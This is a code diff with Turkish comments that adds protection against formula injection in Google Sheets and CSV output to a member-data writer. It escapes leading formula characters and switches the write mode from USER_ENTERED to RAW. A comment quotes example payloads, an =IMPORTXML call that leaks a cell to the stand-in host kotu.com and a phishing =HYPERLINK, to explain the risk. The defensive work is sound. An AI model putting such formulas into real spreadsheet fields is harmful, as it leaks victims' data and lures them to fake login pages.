@@ -37,6 +37,40 @@ export const MEMBER_COLUMNS = [
 
 const LAST_COL = 'ABCDEFGHIJKLMNOPQR'[MEMBER_COLUMNS.length - 1];
 
+/**
+ * GOOGLE SHEETS / CSV FORMUL ENJEKSIYONU KORUMASI
+ *
+ * Sheets'te `=` , `+`, `-`, `@` ile baslayan bir hucre FORMUL olarak
+ * yorumlanir. Saldirgan, "Ad" alanina
+ *   =IMPORTXML("http://kotu.com/varlik?x="&A1,"//a")
+ * yazarak kurbanin tarayicisinda veri sizdirtir ya da
+ *   =HYPERLINK("http://kotu.com","Tikla")
+ * ile sahte giris ekrani gosterebilir.
+ *
+ * Bu yuzden metin degeri tabloya yazilmadan ONCE asagidaki
+ * karakterlerden biriyle basliyorsa tek tirnak ile one alinir.
+ * Kullanici yine metni oldugu gibi gorur, formule cevrilmez.
+ */
+export function escapeFormula(value) {
+  if (value === null || value === undefined) return '';
+  const str = String(value);
+  if (!str) return '';
+  if (/^[=+\-@\t\r]/.test(str)) return "'" + str;
+  return str;
+}
+
+/** Tum uye alanlarini formül enjeksiyonuna karsi temizler. */
+export function sanitizeMember(member) {
+  const clean = { ...member };
+  for (const col of MEMBER_COLUMNS) {
+    if (col === 'passwordHash') continue; // hash zaten guvenli karakterlerden olusur
+    if (typeof clean[col] === 'string') {
+      clean[col] = escapeFormula(clean[col]);
+    }
+  }
+  return clean;
+}
+
 /* ------------------------------------------------------------------ */
 /* Sifre islemleri                                                     */
 /* ------------------------------------------------------------------ */
@@ -342,14 +376,19 @@ export async function writeMembers({
       const prev = existingById.get(String(m.id || '').trim());
       if (prev) member.passwordHash = String(prev[HASH_IDX] ?? '');
     }
-    return memberToRow(member);
+    // Formül enjeksiyonuna karşı tüm metin alanları temizlenir
+    return memberToRow(sanitizeMember(member));
   });
 
   const values = [MEMBER_COLUMNS, ...out];
   await sheets.spreadsheets.values.update({
     spreadsheetId,
     range: `${tab}!A1`,
-    valueInputOption: 'USER_ENTERED',
+    // GUVENLIK: 'RAW' hucre degerini oldugu gibi metin olarak yazar.
+    // 'USER_ENTERED' ise degeri FORMUL olarak yorumlar; saldirgan
+    // "=IMPORTXML(...)" yazarak veri sizdirtabilirdi. Biz veriyi
+    // zaten escapeFormula() ile korudugumuz icin RAW en dogru secim.
+    valueInputOption: 'RAW',
     requestBody: { values },
   });
 
